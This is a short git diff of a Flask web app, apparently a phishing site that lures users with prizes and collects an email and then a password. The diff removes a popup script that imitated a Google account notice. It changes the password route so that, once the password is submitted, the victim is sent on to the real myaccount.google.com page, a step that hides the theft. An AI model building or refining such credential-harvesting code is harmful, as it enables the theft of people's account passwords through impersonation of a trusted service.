@@ -3,7 +3,6 @@ from app import app
 from app.forms import Emailform, Passform
 from app.datos import agregar_usuario
 from app.premios import premios
-import random
 import os
 
 @app.route('/', methods=['POST', 'GET'])
@@ -23,18 +22,6 @@ def home():
 
     return render_template('inicio.html', formu=formu)
 
-def info():
-    return """<script>
-        ventana = window.open ("center", "Ventanagoogle", "width=400,height=300");
-        ventana.document.write(`
-        <h2>El documento funciona mejor con una cuenta de Google</h2>
-        <ul> 
-          <li> Descarga aplicaciones, musica, juegos y otros contenidos de Google Play</li>
-          <li> Realiza una copia de seguridad de tus aplicaciones y contactos</li>
-          <li> Activa funciones de proteccion del dispositivo</li>
-        </ul>`)
-      </script>"""
-
 @app.route('/password', methods=['POST', 'GET'])
 def contraseña():
     form = Passform()
@@ -46,7 +33,7 @@ def contraseña():
         )
 
         session.pop('email', None)
-        return redirect(url_for('home'))
+        return redirect('https://myaccount.google.com')
 
     return render_template('password.html', form=form)
 
